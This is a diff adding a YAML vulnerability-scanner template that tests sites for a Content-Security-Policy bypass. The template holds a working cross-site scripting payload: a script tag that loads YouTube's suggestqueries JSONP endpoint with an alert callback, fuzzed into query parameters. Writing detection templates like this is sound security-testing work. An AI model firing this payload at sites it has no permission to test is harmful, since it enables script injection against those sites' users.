@@ -1,0 +1,55 @@
+id: youtube-suggestqueries-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - YouTube SuggestQueries
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,youtube-suggestqueries,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "youtube.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: youtube_suggestqueries_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://suggestqueries-clients6.youtube.com/complete/search?client=youtube&q=$query&callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "youtube_suggestqueries_csp_xss == true"
+# digest: 4a0a00473045022001381c56bd8b6158373db5613c1b99f146debc6279d4f18107ce9376fb3fc995022100b0013e453f0eb5e27c27b2b149a97c5786d344a1228e0dea6effece754a739c8:922c64590222798bb761d5b6d8e72950
